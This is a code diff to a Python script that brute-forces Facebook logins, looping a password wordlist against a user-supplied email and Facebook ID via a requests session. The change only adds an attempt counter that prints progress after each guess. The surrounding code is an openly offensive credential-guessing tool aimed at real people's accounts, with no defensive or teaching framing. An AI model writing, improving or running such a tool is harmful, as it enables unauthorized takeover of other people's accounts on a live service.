@@ -4,7 +4,7 @@ def brute_force(username, fb_id, passwords):
     login_url = f'https://www.facebook.com/{fb_id}'
     
     with requests.Session() as session:
-        for password in passwords:
+        for i, password in enumerate(passwords, 1):
             data = {
                 'email': username,
                 'pass': password,
@@ -19,6 +19,9 @@ def brute_force(username, fb_id, passwords):
             except requests.RequestException as e:
                 print(f'Error during login attempt: {e}')
 
+            # Print progress after each attempt
+            print(f'Attempt {i}/{len(passwords)}')
+
 if __name__ == "__main__":
     username = input("Enter username/email: ")
     fb_id = input("Enter Facebook ID: ")
@@ -28,7 +31,6 @@ if __name__ == "__main__":
         passwords = [line.strip() for line in file]
 
     brute_force(username, fb_id, passwords)
-
 
 
 
